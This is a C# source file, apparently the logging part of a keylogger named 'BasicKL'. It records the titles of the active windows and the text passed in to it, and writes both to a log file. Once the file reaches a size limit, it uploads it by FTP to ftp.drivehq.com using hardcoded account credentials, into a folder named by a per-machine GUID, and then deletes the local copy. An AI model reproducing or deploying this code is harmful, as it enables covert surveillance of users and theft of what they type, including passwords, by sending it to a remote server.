using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;
using System.IO;
using System.Net;

using log4net;
using log4net.Appender;
using log4net.Repository;
using log4net.Repository.Hierarchy;

namespace BasicKL
{
    public class Logger
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static readonly log4net.ILog log = log4net.LogManager.GetLogger(typeof(Logger));

        private string activeWndTitle;
        private Guid guid;
        private Queue<string> messageBuffer;
        private bool uploading;

        public Logger(Guid guid)
        {
            this.guid = guid;
            this.messageBuffer = new Queue<string>();
            this.uploading = false;
            
            BufferedLog(String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now) + " - " + guid.ToString());
            BufferedLog("\nStarting in "+GetLogPath());
            activeWndTitle = GetActiveWindowTitle();
            BufferedLog(String.Format("\n\n===\n{0}\n===\n", activeWndTitle));
        }

        private void BufferedLog(string msg)
        {
            if (uploading)
            {
                messageBuffer.Enqueue(msg);
            }
            else
            {
                while (messageBuffer.Count > 0)
                {
                    log.Info(messageBuffer.Dequeue());
                }
                log.Info(msg);
            }
        }

        public void Log(string msg)
        {
            string curWndTitle = GetActiveWindowTitle();
            if (curWndTitle != activeWndTitle)
            {
                BufferedLog(String.Format("\n\n===\n{0}\n===\n", curWndTitle));
                activeWndTitle = curWndTitle;
            }

            BufferedLog(msg);

            // If the log is sufficiently large, upload it to remote and clear the log
            if (!uploading)
            {
                int maxSizeMb;
                if (!Int32.TryParse(ConfigurationManager.AppSettings["maxLogSizeMb"], out maxSizeMb))
                    maxSizeMb = 1;

                long maxSizeB = (long)(maxSizeMb) << 20;

                FileInfo logInfo = new FileInfo(GetLogPath());
                if (logInfo.Length >= maxSizeB)
                {
                    UploadMe();
                }
            }
            
        }

        private async void UploadMe()
        {
            uploading = true;

            FtpWebRequest req = (FtpWebRequest)WebRequest.Create("ftp://ftp.drivehq.com/"+guid.ToString());
            req.Credentials = new NetworkCredential("msd7734", "compsec");
            req.Method = WebRequestMethods.Ftp.MakeDirectory;
            FtpWebResponse response = (FtpWebResponse)await req.GetResponseAsync();
            response.Close();

            byte[] b = File.ReadAllBytes(GetLogPath());
            string fname = String.Format("\n{0:d-M-yyyy}", DateTime.Now);

            FtpWebRequest req2 = (FtpWebRequest)WebRequest.Create(
                String.Format("ftp://ftp.drivehq.com/{0}/{1}.txt", guid.ToString(), fname)
            );
            req2.Credentials = new NetworkCredential("msd7734", "compsec");
            req2.Method = WebRequestMethods.Ftp.AppendFile;
            req2.ContentLength = b.Length;
            using (Stream reqStream = await req2.GetRequestStreamAsync())
            {
                await reqStream.WriteAsync(b, 0, b.Length);
            }
            
            FtpWebResponse response2 = (FtpWebResponse)await req2.GetResponseAsync();
            response2.Close();

            File.Delete(GetLogPath());
            log.Info("");

            uploading = false;
        }

        public string GetLogPath()
        {
            var root = LogManager.GetRepository()
                .GetAppenders()
                .OfType<FileAppender>()
                .FirstOrDefault();

            //force create file first
            if (!uploading)
                log.Info("");

            return root != null ? root.File : String.Empty;
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buf = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buf, nChars) > 0)
            {
                return buf.ToString();
            }
            return null;
        }
    }
}
